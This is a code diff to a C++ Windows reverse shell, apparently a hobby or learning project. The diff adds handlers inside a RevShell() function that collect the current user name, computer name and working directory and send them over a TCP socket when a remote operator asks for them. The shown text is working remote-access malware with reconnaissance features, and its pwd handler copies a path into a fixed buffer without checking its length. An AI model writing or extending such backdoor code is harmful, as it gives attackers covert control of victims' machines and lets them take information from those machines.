@@ -7,11 +7,24 @@
 // DEBUG, TEMP.
 #include <iostream>
 
-void whoami(char *returnval, int returnsize)
+void whoami(char* returnval)
 {
 	DWORD bufferlen = 257;
 	// Call WINAPI method, assign it's response to returnval pointer.
 	GetUserName(returnval, &bufferlen);
+}
+
+void hostname(char* returnval)
+{
+	DWORD bufferlen = 257;
+	GetComputerName(returnval,&bufferlen);
+}
+
+void pwd(char* returnval)
+{
+	TCHAR tempvar[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH,tempvar); //returns necessary value into tempvar
+	strcat(returnval,tempvar); //you need to put that value into returnval
 }
 
 void RevShell()
@@ -51,7 +64,7 @@ void RevShell()
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(CommandReceived, "whoami\n") == 0) {
 				char buffer[257] = ""; // reserve buffer with length of 257 bytes
-				whoami(buffer,257); // call whoami function
+				whoami(buffer); // call whoami function
 				strcat(buffer, "\n"); 
 				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
 				// clear buffers
@@ -60,7 +73,22 @@ void RevShell()
 			}
 			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
 			else if (strcmp(CommandReceived, "pwd\n") == 0) {
-				std::cout << "Command parsed: pwd" << std::endl;
+				char buffer[257] = "";
+				pwd(buffer);
+				strcat(buffer, "\n"); 
+				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+				// clear buffers
+				memset(buffer, 0, sizeof(buffer));
+				memset(CommandReceived, 0, sizeof(CommandReceived));
+			}
+			else if (strcmp(CommandReceived, "hostname\n") == 0) {
+				char buffer[257] = "";
+				hostname(buffer);
+				strcat(buffer, "\n"); 
+				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+				// clear buffers
+				memset(buffer, 0, sizeof(buffer));
+				memset(CommandReceived, 0, sizeof(CommandReceived));
 			}
 			else if (strcmp(CommandReceived, "exit\n") == 0) {
 				std::cout << "Command parsed: exit";
